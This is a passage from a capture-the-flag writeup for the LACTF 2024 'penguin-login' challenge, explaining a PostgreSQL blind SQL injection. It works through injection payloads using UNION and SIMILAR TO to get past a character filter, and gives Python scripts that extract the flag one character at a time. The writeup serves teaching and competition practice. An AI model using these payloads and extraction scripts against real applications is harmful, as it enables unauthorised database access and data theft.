<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> penguins <span style="color:#66d9ef">WHERE</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;1&#39;</span>
</span></span></code></pre></div><p><img loading="lazy" src="/writeups/lactf-2024/penguin-login/vid/PlayTest.gif" alt="Example of the just presented &amp;ldquo;technique&amp;rdquo;"  />
</p>
<p>Make sure not to use the mouse or arrow keys (in other words, don&rsquo;t move the cursor) while you&rsquo;re testing your inputs ;)</p>
<h5 id="understanding-if-the-payload-makes-sense">Understanding if the payload makes sense<a hidden class="anchor" aria-hidden="true" href="#understanding-if-the-payload-makes-sense">#</a></h5>
<p>Instead of blindly using a command/trick/workaround/technique that you see for the first time, make sure first that it works as you imagine in a more &ldquo;relaxed&rdquo; context, where you can write and access outputs and error logs without limitations. Discovering that the query returned <code>false</code> because you were not running the command correctly, or that it errored because the command was related to another DBMS, is particularly frustrating.</p>
<p>There are services (like <a href="https://onecompiler.com/postgresql/">OneCompiler</a>, that allow you to execute code directly online. Always make sure 100% when using these services that you have selected the right DBMS.</p>
<p><img loading="lazy" src="/writeups/lactf-2024/penguin-login/img/OnlineExample.png" alt="Example of using OneCompiler to verify the result of an unconventional query"  />
</p>
<h5 id="proceed-in-phases">Proceed in phases<a hidden class="anchor" aria-hidden="true" href="#proceed-in-phases">#</a></h5>
<p>It&rsquo;s helpful to reason in phases the first few times. In mathematics, we can start skipping steps during calculations, but only because we&rsquo;ve become familiar enough:</p>
<ul>
<li>Identify your goal: in this case, &ldquo;I want to get the flag&rdquo; -&gt; &ldquo;I want to get all the characters of the record that starts with the flag format and ends with <code>}</code>&rdquo;.</li>
<li>Write it down as you would normally: <code>SELECT name WHERE name LIKE 'lactf{%}'</code>.</li>
<li>Rewrite it bypassing whitelist and blacklist: <code>SELECT name WHERE name SIMILAR TO 'lactf{_}'</code> with as many <code>_</code> as there are characters in the flag.</li>
<li>Combine the two techniques shown previously: <code>SELECT name WHERE name SIMILAR TO 'lactf{_}'</code> + <code>SELECT * FROM penguins WHERE name = '%s'</code> -&gt; remembering that the only column in the DB is <code>name</code>, and that we can only write commands in place of <code>%s</code>: <code>SELECT * FROM penguins WHERE name = '' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}'</code></li>
</ul>
<p>The payload will simply be what we wrote in this last phase, which is <code>' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}</code></p>
<h3 id="constructing-the-payload">Constructing the payload<a hidden class="anchor" aria-hidden="true" href="#constructing-the-payload">#</a></h3>
<p>At this point, all we have to do is construct a <code>UNION</code> with a <code>SIMILAR TO</code> instead of the more popular <code>LIKE</code>. In my case: <code>' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}</code>.</p>
<p>I&rsquo;m not sure if there was a more convenient way to get the length of the flag, but I just added underscores until I got a positive result. These are the payloads useful for extracting the flag, modified from those used during the competition:</p>
<p><code>findlen.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://penguin.chall.lac.tf/&#34;</span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Session()
</span></span><span style="display:flex;"><span>payloadStart <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; OR name SIMILAR TO &#39;lactf{&#34;</span>
</span></span><span style="display:flex;"><span>payloadEnd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> payloadStart <span style="color:#f92672">+</span> payloadEnd <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}&#34;</span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;submit&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: payload})
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;worked: &#34;</span>, payload)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        payloadEnd <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;_&#34;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;failed: &#34;</span>, payload)
</span></span></code></pre></div><p><code>findflag.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> string <span style="color:#f92672">import</span> digits, ascii_uppercase, ascii_lowercase
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://penguin.chall.lac.tf/&#34;</span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Session()
</span></span><span style="display:flex;"><span>payloadStart <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; OR name SIMILAR TO &#39;lactf{&#34;</span>
</span></span><span style="display:flex;"><span>payloadEnd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;______________________________________&#34;</span>
</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(payloadEnd) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        payloadEnd <span style="color:#f92672">=</span> payloadEnd[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> digits <span style="color:#f92672">+</span> ascii_lowercase <span style="color:#f92672">+</span> ascii_uppercase:
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> payloadStart <span style="color:#f92672">+</span> c <span style="color:#f92672">+</span> payloadEnd <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}&#34;</span>
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;submit&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: payload})
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;worked: &#34;</span>, payload)
</span></span><span style="display:flex;"><span>            payloadStart <span style="color:#f92672">+=</span> c
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;failed: &#34;</span>, payload)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        payloadStart <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;_&#34;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;skipping: &#34;</span>, payload)
</span></span></code></pre></div><p>Due to infrastructure issues, the first character of the flag couldn&rsquo;t be retrieved. I had to guess it (in quite a few attempts xd). P.S. It seems like there was a way to exfiltrate the first character of the flag. I&rsquo;ll act like I didn&rsquo;t see that.</p>
<p><img loading="lazy" src="/writeups/lactf-2024/penguin-login/vid/FinalPayload.gif" alt="Execution of the final script"  />
</p>
<p><code>lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}</code></p>
<p><img loading="lazy" src="/writeups/lactf-2024/penguin-login/img/InterestingTicket.png" alt="Extract from an interesting conversation had in a ticket"  />
</p>
<h3 id="how-it-actually-went-during-the-ctf">How it actually went during the CTF<a hidden class="anchor" aria-hidden="true" href="#how-it-actually-went-during-the-ctf">#</a></h3>
<p>One evening, I was at the gym to vent the frustration of not being able to find a rock on the west coast of California, United States (I love OSINT). Just before leaving, I heard that one of my teammates was having a bad time with an SQLi. &ldquo;Let me solve it,&rdquo; I wrote to him.</p>
<p>I hadn&rsquo;t read the code yet when I received a message on Discord from said player, expressing interest in solving the challenge. &ldquo;Just use <code>_</code>&rdquo;, I said jokingly. I didn&rsquo;t know that the character was actually whitelisted.</p>
<p>My teammate had already discovered the existence of <code>SIMILAR TO</code>, so once I got home, I only had to deal with writing the payload.</p>
<h4 id="payload-used-during-the-ctf">Payload used during the CTF<a hidden class="anchor" aria-hidden="true" href="#payload-used-during-the-ctf">#</a></h4>
<p><code>findlen.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://penguin.chall.lac.tf/&#34;</span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Session()
</span></span><span style="display:flex;"><span>payloadStart <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; OR name SIMILAR TO &#39;lactf{&#34;</span>
</span></span><span style="display:flex;"><span>payloadEnd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> payloadStart <span style="color:#f92672">+</span> payloadEnd <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}&#34;</span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;submit&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: payload})
</span></span><span style="display:flex;"><span>    soup <span style="color:#f92672">=</span> BeautifulSoup(r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;We found a penguin&#34;</span> <span style="color:#f92672">in</span> soup<span style="color:#f92672">.</span>get_text():
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;worked: &#34;</span>, payload)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        payloadEnd <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;_&#34;</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;failed: &#34;</span>, payload)
</span></span></code></pre></div><p><code>findflag.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> string <span style="color:#f92672">import</span> digits, ascii_uppercase, ascii_lowercase
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://penguin.chall.lac.tf/&#34;</span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Session()
</span></span><span style="display:flex;"><span>payloadStart <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; OR name SIMILAR TO &#39;lactf{&#34;</span>
</span></span><span style="display:flex;"><span>payloadEnd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;______________________________________&#34;</span>
</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    payloadEnd <span style="color:#f92672">=</span> payloadEnd[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> digits <span style="color:#f92672">+</span> ascii_lowercase <span style="color:#f92672">+</span> ascii_uppercase <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!-@&#34;</span>:
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> payloadStart <span style="color:#f92672">+</span> c <span style="color:#f92672">+</span> payloadEnd <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}&#34;</span>
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;submit&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: payload})
</span></span><span style="display:flex;"><span>        soup <span style="color:#f92672">=</span> BeautifulSoup(r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;We found a penguin&#34;</span> <span style="color:#f92672">in</span> soup<span style="color:#f92672">.</span>get_text():
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;worked: &#34;</span>, payload)
</span></span><span style="display:flex;"><span>            payloadStart <span style="color:#f92672">+=</span> c
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;failed: &#34;</span>, payload)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;end: &#34;</span>, payload)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span></code></pre></div><p>I was too lazy to press F12 while playing around, so I just based my final payload on the <code>&quot;We found a penguin!!!!!&quot;</code> response.</p>
<h2 id="feedback">Feedback<a hidden class="anchor" aria-hidden="true" href="#feedback">#</a></h2>
<p>I&rsquo;m open to questions, feedbacks, and DMs in general! @titto_caru on Discord</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctfs/">CTFs</a></li>
      <li><a href="http://localhost:1313/tags/lactf-2024/">Lactf-2024</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="http://localhost:1313/">Tiziano Caruana</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
